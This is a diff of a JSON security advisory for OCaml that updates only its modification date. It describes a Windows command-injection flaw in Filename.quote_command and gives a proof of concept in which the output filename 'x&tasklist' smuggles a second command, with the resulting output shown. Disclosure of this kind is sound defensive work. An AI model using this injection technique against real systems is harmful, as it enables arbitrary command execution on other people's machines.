@@ -1,7 +1,7 @@
 {
   "id": "OSEC-2026-05",
   "published": "2026-06-18T13:45:00",
-  "modified": "2026-06-18T14:26:26.886874",
+  "modified": "2026-09-10T11:00:02.947158",
   "details": "The quoting of stdin/stdout/stderror (using `Filename.quote_command`) on Windows is not sufficient, and allows the `&` character to be passed through. This allows an attacker to inject a shell command if they can specify the stdin/stdout/stderr of a program to be executed.\n\n## Exploit\n\n```bash\n$ opam exec -- ocaml\nOCaml version 4.14.2\nEnter #help;; for help.\n\n# let outfile = \"x&tasklist\" in\n  let cmd = Filename.quote_command \"netsh.exe\" ~stdout:outfile [\"help\"] in\n  ignore (Sys.command cmd)\n  ;;\n\nImage Name                     PID Session Name        Session#    Mem Usage\n========================= ======== ================ =========== ============\nSystem Idle Process              0 Services                   0          8 K\nSystem                           4 Services                   0        168 K\nSecure System                  236 Services                   0    191,468 K\nRegistry                       276 Services                   0      3,428 K\nsmss.exe                       608 Services                   0      1,676 K\ncsrss.exe                      984 Services                   0      5,928 K\n```\n\n## Timeline\n\n- 2026-06-18 release of this security advisory\n- 2026-06-15 release of OCaml 4.14.4\n- 2026-06-08 fix by David Allsopp https://github.com/ocaml/ocaml/pull/14853\n- 2026-04-11 reported by Anil Madhavapeddy, forwarded from Andrew Nesbitt to security@ocaml.org",
   "summary": "Windows command execution via filename quotes.",
   "severity": [
